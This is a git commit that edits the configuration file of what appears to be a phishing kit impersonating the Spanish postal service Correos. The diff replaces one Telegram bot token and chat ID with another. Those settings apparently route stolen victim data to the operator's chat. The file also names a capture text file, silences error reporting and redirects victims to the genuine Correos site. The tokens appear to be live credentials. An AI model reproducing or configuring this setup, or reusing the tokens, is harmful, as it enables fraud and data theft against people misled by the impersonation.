6e89243340024c5684f441d805c3b7852e79f7c3
HamadaRIgaloo <119463837+HamadaRIgaloo@users.noreply.github.com>
2022-12-03 16:11:27 +0100

    Update conf.php

--- settings/conf.php
+++ settings/conf.php
@@ -2,9 +2,9 @@
 
 error_reporting(0);
 
-define("TELEGRAM_TOKEN", "5794569310:AAHKTIK_YvamgIBGE0dUMf3QtR-N7acpu1o");
-define("TELEGRAM_CHAT_ID", "869785984");
-define("TELEGRAM_CHAT_IDD", "-869785984");
+define("TELEGRAM_TOKEN", "5685344408:AAFecHM0jruHFn06IdPB2uEwBf1UpiyaDaI");
+define("TELEGRAM_CHAT_ID", "863944893");
+define("TELEGRAM_CHAT_IDD", "-863944893");
 define("TXT_FILE_NAME", 'mjinina.txt');
 define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
 
